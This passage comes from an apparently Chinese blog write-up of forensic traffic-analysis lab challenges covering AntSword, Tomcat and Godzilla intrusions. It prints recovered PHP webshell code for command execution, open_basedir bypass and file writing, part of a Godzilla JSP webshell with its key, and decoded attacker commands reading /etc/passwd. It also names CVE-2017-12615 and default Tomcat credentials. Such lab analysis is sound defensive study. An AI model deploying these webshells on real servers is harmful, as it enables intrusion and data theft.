invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                    <span class="keyword">return</span> True;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> False;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">            <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = @<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-154529689.png" class=""><br>其会对接受的参数从低三位开始base64解码</p><p>解码内容如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line">cd &quot;/var/www/html&quot;;id;echo e124bc;pwd;echo 43523</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>cd “/var/www/html”不对，但是输入id就对了</p><h2 id="黑客读取了哪个文件的内容，提交文件绝对路径"><a href="#黑客读取了哪个文件的内容，提交文件绝对路径" class="headerlink" title="黑客读取了哪个文件的内容，提交文件绝对路径"></a>黑客读取了哪个文件的内容，提交文件绝对路径</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-154800806.png" class="">  <p>第二个流发现了/etc/passwd</p><h2 id="黑客上传了什么文件到服务器，提交文件名"><a href="#黑客上传了什么文件到服务器，提交文件名" class="headerlink" title="黑客上传了什么文件到服务器，提交文件名"></a>黑客上传了什么文件到服务器，提交文件名</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-154837859.png" class="">  <p>整理一下第三个流<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.368479785&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;6960&quot;</span> . <span class="string">&quot;cb205&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;1e0a&quot;</span> . <span class="string">&quot;91914&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;t41ffbc5fb0c04&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;ld807e7193493d&quot;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$buf</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>); <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$buf</span> .= <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="variable">$i</span>, <span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> (@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>, <span class="string">&quot;a&quot;</span>), <span class="variable">$buf</span>) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>文件名就是<code>$f</code>即去两位base64<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0ZL3Zhci93d3cvaHRtbC9mbGFnLnR4dA-&gt;/var/www/html/flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="上传文件的内容"><a href="#上传文件的内容" class="headerlink" title="上传文件的内容"></a>上传文件的内容</h2><p>看流量可以知道其将<code>$_POST[&quot;ld807e7193493d&quot;];</code>的内容两两加上%然后解码，之后使用fwrite写入文件，即这个流量在文件上传在文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;666C61677B77726974655F666C61677D0A&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$buf</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>); <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line"><span class="variable">$buf</span> .= <span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="variable">$i</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$buf</span>);</span><br></pre></td></tr></table></figure><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-155252497.png" class="">  <h2 id="下载的文件路径"><a href="#下载的文件路径" class="headerlink" title="下载的文件路径"></a>下载的文件路径</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-155713451.png" class="">  <p>流5读取了文件内容，解一下码可以知道文件路径为<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L3Zhci93d3cvaHRtbC9jb25maWcucGhw-&gt;/var/www/html/config.php</span><br></pre></td></tr></table></figure></p><h1 id="第六章-流量特征分析-常见攻击事件-tomcat"><a href="#第六章-流量特征分析-常见攻击事件-tomcat" class="headerlink" title="第六章 流量特征分析-常见攻击事件 tomcat"></a>第六章 流量特征分析-常见攻击事件 tomcat</h1><h2 id="攻击者ip"><a href="#攻击者ip" class="headerlink" title="攻击者ip"></a>攻击者ip</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-160049834.png" class="">  <p>明显14.0.0.120用nmap在扫端口</p><h2 id="找到攻击者IP后请通过技术手段确定其所在地址-flag格式-flag-城市英文小写"><a href="#找到攻击者IP后请通过技术手段确定其所在地址-flag格式-flag-城市英文小写" class="headerlink" title="找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}"></a>找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-161346727.png" class="">  <h2 id="哪一个端口提供对web服务器管理面板的访问？-flag格式：flag-2222"><a href="#哪一个端口提供对web服务器管理面板的访问？-flag格式：flag-2222" class="headerlink" title="哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}"></a>哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-161542175.png" class="">  <img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-161617620.png" class="">  <p>8080</p><h2 id="经过前面对攻击者行为的分析后-攻击者运用的工具是？-flag格式：flag-名称"><a href="#经过前面对攻击者行为的分析后-攻击者运用的工具是？-flag格式：flag-名称" class="headerlink" title="经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}"></a>经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-165407023.png" class="">  <h2 id="账号密码为"><a href="#账号密码为" class="headerlink" title="账号密码为"></a>账号密码为</h2><p>直接过滤出http.authorization请求头的流量<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-162827197.png" class=""><br>解码得到账号密码<br>admin:tomcat</p><h2 id="攻击者登录成功后-先要建立反弹shell-请分析流量提交恶意文件的名称？-flag格式：flag-114514-txt"><a href="#攻击者登录成功后-先要建立反弹shell-请分析流量提交恶意文件的名称？-flag格式：flag-114514-txt" class="headerlink" title="攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}"></a>攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-163122905.png" class="">  <p>传了个war包标准的拿shell流程</p><h2 id="攻击者想要维持提权成功后的登录-请分析流量后提交关键的信息？-flag提示-某种任务里的信息"><a href="#攻击者想要维持提权成功后的登录-请分析流量后提交关键的信息？-flag提示-某种任务里的信息" class="headerlink" title="攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息"></a>攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-164127784.png" class="">  <p>传的马是直接从tcp流里面获取参数<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-164736268.png" class=""><br>应该是弹shell的命令尝试了后发现是的</p><h1 id="哥斯拉4-0流量分析"><a href="#哥斯拉4-0流量分析" class="headerlink" title="哥斯拉4.0流量分析"></a>哥斯拉4.0流量分析</h1><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-170512461.png" class="">  <p><code>flag&#123;192.168.31.190&#125;</code></p><h2 id="使用漏洞的cve编号"><a href="#使用漏洞的cve编号" class="headerlink" title="使用漏洞的cve编号"></a>使用漏洞的cve编号</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-170844177.png" class=""><p>不难看出来其是使用put文件上传，传shell<br>CVE-2017-12615 Tomcat PUT<br><code>flag&#123;CVE-2017-12615&#125;</code></p><h2 id="黑客上传的木马文件叫"><a href="#黑客上传的木马文件叫" class="headerlink" title="黑客上传的木马文件叫?"></a>黑客上传的木马文件叫?</h2><p>hello.jsp</p><h2 id="连接密码为"><a href="#连接密码为" class="headerlink" title="连接密码为?"></a>连接密码为?</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&lt;% !<span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;1710acba6220f62b&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;7f0e6f&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(pass + xc);</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.security.MessageDigest m;</span><br><span class="line">        m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">        ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        